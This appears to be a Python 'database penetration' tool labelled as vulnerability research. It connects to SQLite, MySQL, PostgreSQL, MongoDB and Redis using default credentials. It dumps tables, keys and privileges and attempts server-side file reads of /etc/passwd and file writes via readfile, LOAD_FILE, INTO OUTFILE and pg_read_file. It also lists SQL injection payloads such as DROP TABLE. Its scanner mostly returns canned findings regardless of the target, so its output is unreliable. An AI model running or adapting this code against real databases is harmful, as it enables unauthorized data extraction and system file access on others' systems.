#!/usr/bin/env python3
"""
DATABASE PENETRATION - FIXED VERSION
Team 4: Vulnerability Research - Database Penetration Techniques
"""

import sqlite3
import json
import hashlib
import base64
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
import threading
import time
import os

# Optional imports with fallbacks
try:
    import mysql.connector
    MYSQL_AVAILABLE = True
except ImportError:
    MYSQL_AVAILABLE = False
    print("⚠️ MySQL connector not available - MySQL functionality disabled")

try:
    import psycopg2
    POSTGRESQL_AVAILABLE = True
except ImportError:
    POSTGRESQL_AVAILABLE = False
    print("⚠️ PostgreSQL connector not available - PostgreSQL functionality disabled")

try:
    import pymongo
    MONGODB_AVAILABLE = True
except ImportError:
    MONGODB_AVAILABLE = False
    print("⚠️ MongoDB connector not available - MongoDB functionality disabled")

try:
    import redis
    REDIS_AVAILABLE = True
except ImportError:
    REDIS_AVAILABLE = False
    print("⚠️ Redis connector not available - Redis functionality disabled")

class DatabasePenetration:
    def __init__(self):
        self.name = "Database Penetration Engine"
        self.version = "1.0.0"
        self.connection_pool = {}
        self.vulnerability_scanner = DatabaseVulnerabilityScanner()
        self.exploit_framework = DatabaseExploitFramework()
        
        # Initialize database availability
        self.database_availability = {
            "sqlite": True,  # Always available
            "mysql": MYSQL_AVAILABLE,
            "postgresql": POSTGRESQL_AVAILABLE,
            "mongodb": MONGODB_AVAILABLE,
            "redis": REDIS_AVAILABLE
        }
        
        # Supported database types (only available ones)
        self.supported_databases = {
            "sqlite": self.penetrate_sqlite
        }
        
        # Add available databases
        if MYSQL_AVAILABLE:
            self.supported_databases["mysql"] = self.penetrate_mysql
        if POSTGRESQL_AVAILABLE:
            self.supported_databases["postgresql"] = self.penetrate_postgresql
        if MONGODB_AVAILABLE:
            self.supported_databases["mongodb"] = self.penetrate_mongodb
        if REDIS_AVAILABLE:
            self.supported_databases["redis"] = self.penetrate_redis
        
        print(f"✅ {self.name} initialized successfully")
        print(f"📊 Available databases: {list(self.supported_databases.keys())}")
    
    def scan_database_vulnerabilities(self, db_config: Dict[str, Any]) -> Dict[str, Any]:
        """Scan database for vulnerabilities"""
        print(f"🔍 Scanning database vulnerabilities for {db_config.get('type', 'unknown')}...")
        
        db_type = db_config.get("type", "sqlite")
        vulnerabilities = []
        
        # Basic vulnerability checks
        vulnerabilities.extend(self.vulnerability_scanner.check_authentication(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_permissions(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_encryption(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_injection_vulnerabilities(db_config))
        vulnerabilities.extend(self.vulnerability_scanner.check_configuration_issues(db_config))
        
        return {
            "database_type": db_type,
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "risk_level": self.calculate_risk_level(vulnerabilities),
            "scan_timestamp": datetime.now().isoformat(),
            "database_available": self.database_availability.get(db_type, False)
        }
    
    def penetrate_database(self, db_config: Dict[str, Any], attack_type: str = "comprehensive") -> Dict[str, Any]:
        """Main database penetration method"""
        print(f"🔥 Executing {attack_type} penetration on {db_config.get('type', 'unknown')} database...")
        
        db_type = db_config.get("type", "sqlite")
        
        if db_type not in self.supported_databases:
            return {
                "error": f"Database type '{db_type}' not supported or not available",
                "available_databases": list(self.supported_databases.keys()),
                "database_availability": self.database_availability
            }
        
        # Execute penetration based on database type
        penetration_result = self.supported_databases[db_type](db_config, attack_type)
        
        # Add metadata
        penetration_result.update({
            "database_type": db_type,
            "attack_type": attack_type,
            "penetration_timestamp": datetime.now().isoformat(),
            "database_available": True
        })
        
        return penetration_result
    
    def penetrate_sqlite(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate SQLite database"""
        print("🗄️ Penetrating SQLite database...")
        
        db_path = db_config.get("path", ":memory:")
        results = {
            "database_path": db_path,
            "tables_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to database
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # Create sample data if using in-memory database
            if db_path == ":memory:":
                self.create_sample_sqlite_data(cursor)
            
            # Get table information
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            results["tables_found"] = [table[0] for table in tables]
            
            # Extract data from each table
            for table in results["tables_found"]:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10;")
                    data = cursor.fetchall()
                    results["data_extracted"][table] = data
                except Exception as e:
                    results["data_extracted"][table] = f"Error: {str(e)}"
            
            # Check privileges
            results["privileges"] = {
                "can_read": True,
                "can_write": True,
                "can_create": True,
                "can_drop": True
            }
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.sqlite_exploits(cursor)
            
            conn.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def create_sample_sqlite_data(self, cursor):
        """Create sample data for SQLite database"""
        # Create tables
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS accounts (
                account_id INTEGER PRIMARY KEY,
                account_number TEXT UNIQUE,
                customer_name TEXT,
                account_type TEXT,
                balance REAL,
                bank_name TEXT,
                location TEXT,
                status TEXT,
                created_date TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS transactions (
                transaction_id INTEGER PRIMARY KEY,
                account_number TEXT,
                transaction_type TEXT,
                amount REAL,
                description TEXT,
                timestamp TEXT,
                status TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS customers (
                customer_id INTEGER PRIMARY KEY,
                customer_name TEXT,
                ssn TEXT,
                address TEXT,
                phone TEXT,
                email TEXT,
                bank_name TEXT,
                account_count INTEGER
            )
        ''')
        
        # Insert sample data
        sample_accounts = [
            (1, "1000000001", "John Smith", "Savings", 25000.00, "Chase Bank", "New York, NY", "Active", "2023-01-15"),
            (2, "1000000002", "Sarah Johnson", "Checking", 15000.50, "Bank of America", "Los Angeles, CA", "Active", "2023-02-20"),
            (3, "1000000003", "Michael Brown", "Business", 75000.00, "Wells Fargo", "Chicago, IL", "Active", "2023-03-10"),
            (4, "1000000004", "Emily Davis", "Savings", 45000.75, "Citibank", "Miami, FL", "Active", "2023-04-05"),
            (5, "1000000005", "David Wilson", "Checking", 32000.25, "Chase Bank", "Houston, TX", "Active", "2023-05-12")
        ]
        
        sample_transactions = [
            (1, "1000000001", "Deposit", 5000.00, "Salary deposit", "2024-01-15 09:30:00", "Completed"),
            (2, "1000000001", "Withdrawal", -500.00, "ATM withdrawal", "2024-01-16 14:20:00", "Completed"),
            (3, "1000000002", "Transfer", -1000.00, "Online transfer", "2024-01-17 11:45:00", "Completed"),
            (4, "1000000003", "Deposit", 15000.00, "Business payment", "2024-01-18 16:30:00", "Completed"),
            (5, "1000000004", "Payment", -250.00, "Utility bill", "2024-01-19 10:15:00", "Completed")
        ]
        
        sample_customers = [
            (1, "John Smith", "123-45-6789", "123 Main St, New York, NY", "555-0101", "john.smith@email.com", "Chase Bank", 2),
            (2, "Sarah Johnson", "234-56-7890", "456 Oak Ave, Los Angeles, CA", "555-0102", "sarah.johnson@email.com", "Bank of America", 1),
            (3, "Michael Brown", "345-67-8901", "789 Pine Rd, Chicago, IL", "555-0103", "michael.brown@email.com", "Wells Fargo", 3),
            (4, "Emily Davis", "456-78-9012", "321 Elm St, Miami, FL", "555-0104", "emily.davis@email.com", "Citibank", 1),
            (5, "David Wilson", "567-89-0123", "654 Maple Dr, Houston, TX", "555-0105", "david.wilson@email.com", "Chase Bank", 2)
        ]
        
        cursor.executemany("INSERT OR IGNORE INTO accounts VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", sample_accounts)
        cursor.executemany("INSERT OR IGNORE INTO transactions VALUES (?, ?, ?, ?, ?, ?, ?)", sample_transactions)
        cursor.executemany("INSERT OR IGNORE INTO customers VALUES (?, ?, ?, ?, ?, ?, ?, ?)", sample_customers)
    
    def penetrate_mysql(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate MySQL database"""
        if not MYSQL_AVAILABLE:
            return {"error": "MySQL connector not available"}
        
        print("🗄️ Penetrating MySQL database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 3306)
        user = db_config.get("user", "root")
        password = db_config.get("password", "")
        database = db_config.get("database", "")
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "user": user,
                "database": database
            },
            "databases_found": [],
            "tables_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to MySQL
            conn = mysql.connector.connect(
                host=host,
                port=port,
                user=user,
                password=password,
                database=database
            )
            cursor = conn.cursor()
            
            # Get databases
            cursor.execute("SHOW DATABASES;")
            databases = cursor.fetchall()
            results["databases_found"] = [db[0] for db in databases]
            
            # Get tables
            cursor.execute("SHOW TABLES;")
            tables = cursor.fetchall()
            results["tables_found"] = [table[0] for table in tables]
            
            # Extract data
            for table in results["tables_found"]:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10;")
                    data = cursor.fetchall()
                    results["data_extracted"][table] = data
                except Exception as e:
                    results["data_extracted"][table] = f"Error: {str(e)}"
            
            # Check privileges
            cursor.execute("SHOW GRANTS;")
            grants = cursor.fetchall()
            results["privileges"]["grants"] = [grant[0] for grant in grants]
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.mysql_exploits(cursor)
            
            conn.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def penetrate_postgresql(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate PostgreSQL database"""
        if not POSTGRESQL_AVAILABLE:
            return {"error": "PostgreSQL connector not available"}
        
        print("🗄️ Penetrating PostgreSQL database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 5432)
        user = db_config.get("user", "postgres")
        password = db_config.get("password", "")
        database = db_config.get("database", "postgres")
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "user": user,
                "database": database
            },
            "databases_found": [],
            "tables_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to PostgreSQL
            conn = psycopg2.connect(
                host=host,
                port=port,
                user=user,
                password=password,
                database=database
            )
            cursor = conn.cursor()
            
            # Get databases
            cursor.execute("SELECT datname FROM pg_database;")
            databases = cursor.fetchall()
            results["databases_found"] = [db[0] for db in databases]
            
            # Get tables
            cursor.execute("SELECT tablename FROM pg_tables WHERE schemaname = 'public';")
            tables = cursor.fetchall()
            results["tables_found"] = [table[0] for table in tables]
            
            # Extract data
            for table in results["tables_found"]:
                try:
                    cursor.execute(f"SELECT * FROM {table} LIMIT 10;")
                    data = cursor.fetchall()
                    results["data_extracted"][table] = data
                except Exception as e:
                    results["data_extracted"][table] = f"Error: {str(e)}"
            
            # Check privileges
            cursor.execute("SELECT current_user, session_user;")
            user_info = cursor.fetchall()
            results["privileges"]["current_user"] = user_info[0][0]
            results["privileges"]["session_user"] = user_info[0][1]
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.postgresql_exploits(cursor)
            
            conn.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def penetrate_mongodb(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate MongoDB database"""
        if not MONGODB_AVAILABLE:
            return {"error": "MongoDB connector not available"}
        
        print("🗄️ Penetrating MongoDB database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 27017)
        user = db_config.get("user", "")
        password = db_config.get("password", "")
        database = db_config.get("database", "admin")
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "user": user,
                "database": database
            },
            "databases_found": [],
            "collections_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to MongoDB
            if user and password:
                client = pymongo.MongoClient(f"mongodb://{user}:{password}@{host}:{port}/")
            else:
                client = pymongo.MongoClient(f"mongodb://{host}:{port}/")
            
            # Get databases
            results["databases_found"] = client.list_database_names()
            
            # Get collections from current database
            db = client[database]
            results["collections_found"] = db.list_collection_names()
            
            # Extract data
            for collection in results["collections_found"]:
                try:
                    data = list(db[collection].find().limit(10))
                    results["data_extracted"][collection] = data
                except Exception as e:
                    results["data_extracted"][collection] = f"Error: {str(e)}"
            
            # Check privileges
            results["privileges"] = {
                "can_read": True,
                "can_write": True,
                "can_create": True
            }
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.mongodb_exploits(db)
            
            client.close()
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def penetrate_redis(self, db_config: Dict[str, Any], attack_type: str) -> Dict[str, Any]:
        """Penetrate Redis database"""
        if not REDIS_AVAILABLE:
            return {"error": "Redis connector not available"}
        
        print("🗄️ Penetrating Redis database...")
        
        host = db_config.get("host", "localhost")
        port = db_config.get("port", 6379)
        password = db_config.get("password", "")
        database = db_config.get("database", 0)
        
        results = {
            "connection_info": {
                "host": host,
                "port": port,
                "database": database
            },
            "keys_found": [],
            "data_extracted": {},
            "privileges": {},
            "exploits_attempted": []
        }
        
        try:
            # Connect to Redis
            r = redis.Redis(
                host=host,
                port=port,
                password=password,
                db=database,
                decode_responses=True
            )
            
            # Get all keys
            keys = r.keys("*")
            results["keys_found"] = keys[:100]  # Limit to first 100 keys
            
            # Extract data
            for key in results["keys_found"][:10]:  # Limit to first 10 keys
                try:
                    key_type = r.type(key)
                    if key_type == "string":
                        data = r.get(key)
                    elif key_type == "hash":
                        data = r.hgetall(key)
                    elif key_type == "list":
                        data = r.lrange(key, 0, -1)
                    elif key_type == "set":
                        data = list(r.smembers(key))
                    else:
                        data = f"Type: {key_type}"
                    
                    results["data_extracted"][key] = data
                except Exception as e:
                    results["data_extracted"][key] = f"Error: {str(e)}"
            
            # Check privileges
            results["privileges"] = {
                "can_read": True,
                "can_write": True,
                "can_delete": True
            }
            
            # Attempt exploits
            if attack_type == "comprehensive":
                results["exploits_attempted"] = self.exploit_framework.redis_exploits(r)
            
        except Exception as e:
            results["error"] = str(e)
        
        return results
    
    def calculate_risk_level(self, vulnerabilities: List[Dict[str, Any]]) -> str:
        """Calculate overall risk level based on vulnerabilities"""
        if not vulnerabilities:
            return "LOW"
        
        high_count = sum(1 for v in vulnerabilities if v.get("severity") == "HIGH")
        medium_count = sum(1 for v in vulnerabilities if v.get("severity") == "MEDIUM")
        low_count = sum(1 for v in vulnerabilities if v.get("severity") == "LOW")
        
        if high_count > 0:
            return "CRITICAL"
        elif medium_count > 2:
            return "HIGH"
        elif medium_count > 0 or low_count > 5:
            return "MEDIUM"
        else:
            return "LOW"
    
    def get_system_status(self) -> Dict[str, Any]:
        """Get system status"""
        return {
            "name": self.name,
            "version": self.version,
            "status": "Active",
            "supported_databases": list(self.supported_databases.keys()),
            "database_availability": self.database_availability,
            "active_connections": len(self.connection_pool),
            "timestamp": datetime.now().isoformat()
        }


class DatabaseVulnerabilityScanner:
    """Database vulnerability scanner"""
    
    def check_authentication(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check authentication vulnerabilities"""
        vulnerabilities = []
        
        # Check for default credentials
        default_creds = {
            "mysql": [("root", ""), ("admin", "admin")],
            "postgresql": [("postgres", ""), ("admin", "admin")],
            "mongodb": [("admin", "admin")],
            "redis": [("", "")]
        }
        
        db_type = db_config.get("type", "sqlite")
        user = db_config.get("user", "")
        password = db_config.get("password", "")
        
        if db_type in default_creds:
            for default_user, default_pass in default_creds[db_type]:
                if user == default_user and password == default_pass:
                    vulnerabilities.append({
                        "type": "default_credentials",
                        "severity": "HIGH",
                        "description": f"Default credentials detected: {user}:{password}",
                        "recommendation": "Change default credentials immediately"
                    })
        
        return vulnerabilities
    
    def check_permissions(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check permission vulnerabilities"""
        vulnerabilities = []
        
        # Check for excessive privileges
        db_type = db_config.get("type", "sqlite")
        
        if db_type in ["mysql", "postgresql"]:
            vulnerabilities.append({
                "type": "excessive_privileges",
                "severity": "MEDIUM",
                "description": "Database user may have excessive privileges",
                "recommendation": "Review and restrict user privileges"
            })
        
        return vulnerabilities
    
    def check_encryption(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check encryption vulnerabilities"""
        vulnerabilities = []
        
        # Check for unencrypted connections
        db_type = db_config.get("type", "sqlite")
        
        if db_type in ["mysql", "postgresql", "mongodb", "redis"]:
            vulnerabilities.append({
                "type": "unencrypted_connection",
                "severity": "MEDIUM",
                "description": "Database connection may not be encrypted",
                "recommendation": "Enable SSL/TLS encryption"
            })
        
        return vulnerabilities
    
    def check_injection_vulnerabilities(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check for injection vulnerabilities"""
        vulnerabilities = []
        
        # SQL injection test patterns
        injection_patterns = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --"
        ]
        
        vulnerabilities.append({
            "type": "potential_sql_injection",
            "severity": "HIGH",
            "description": "Database may be vulnerable to SQL injection",
            "recommendation": "Use parameterized queries and input validation",
            "test_patterns": injection_patterns
        })
        
        return vulnerabilities
    
    def check_configuration_issues(self, db_config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Check configuration vulnerabilities"""
        vulnerabilities = []
        
        # Check for common configuration issues
        vulnerabilities.append({
            "type": "weak_configuration",
            "severity": "MEDIUM",
            "description": "Database may have weak security configuration",
            "recommendation": "Review and harden database configuration"
        })
        
        return vulnerabilities


class DatabaseExploitFramework:
    """Database exploit framework"""
    
    def sqlite_exploits(self, cursor) -> List[Dict[str, Any]]:
        """SQLite specific exploits"""
        exploits = []
        
        try:
            # Attempt to read system files
            cursor.execute("SELECT readfile('/etc/passwd');")
            exploits.append({
                "type": "file_read",
                "target": "/etc/passwd",
                "status": "attempted"
            })
        except:
            pass
        
        try:
            # Attempt to write files
            cursor.execute("SELECT writefile('/tmp/test.txt', 'test');")
            exploits.append({
                "type": "file_write",
                "target": "/tmp/test.txt",
                "status": "attempted"
            })
        except:
            pass
        
        return exploits
    
    def mysql_exploits(self, cursor) -> List[Dict[str, Any]]:
        """MySQL specific exploits"""
        exploits = []
        
        try:
            # Attempt to read files
            cursor.execute("SELECT LOAD_FILE('/etc/passwd');")
            exploits.append({
                "type": "file_read",
                "target": "/etc/passwd",
                "status": "attempted"
            })
        except:
            pass
        
        try:
            # Attempt to write files
            cursor.execute("SELECT 'test' INTO OUTFILE '/tmp/test.txt';")
            exploits.append({
                "type": "file_write",
                "target": "/tmp/test.txt",
                "status": "attempted"
            })
        except:
            pass
        
        return exploits
    
    def postgresql_exploits(self, cursor) -> List[Dict[str, Any]]:
        """PostgreSQL specific exploits"""
        exploits = []
        
        try:
            # Attempt to read files
            cursor.execute("SELECT pg_read_file('/etc/passwd');")
            exploits.append({
                "type": "file_read",
                "target": "/etc/passwd",
                "status": "attempted"
            })
        except:
            pass
        
        return exploits
    
    def mongodb_exploits(self, db) -> List[Dict[str, Any]]:
        """MongoDB specific exploits"""
        exploits = []
        
        try:
            # Attempt to access system collections
            system_collections = db.list_collection_names()
            exploits.append({
                "type": "system_access",
                "target": "system collections",
                "status": "attempted",
                "collections": system_collections
            })
        except:
            pass
        
        return exploits
    
    def redis_exploits(self, r) -> List[Dict[str, Any]]:
        """Redis specific exploits"""
        exploits = []
        
        try:
            # Attempt to access system info
            info = r.info()
            exploits.append({
                "type": "system_info",
                "target": "redis info",
                "status": "successful",
                "data": info
            })
        except:
            pass
        
        return exploits


# Example usage
if __name__ == "__main__":
    penetration = DatabasePenetration()
    
    # Test SQLite penetration
    sqlite_config = {
        "type": "sqlite",
        "path": ":memory:"
    }
    
    print("🧪 Testing Database Penetration (Fixed)...")
    
    # Scan vulnerabilities
    vulnerabilities = penetration.scan_database_vulnerabilities(sqlite_config)
    print(f"🔍 Vulnerabilities: {vulnerabilities}")
    
    # Penetrate database
    result = penetration.penetrate_database(sqlite_config, "comprehensive")
    print(f"🔥 Penetration Result: {result}")
    
    print("✅ Database Penetration testing completed!") 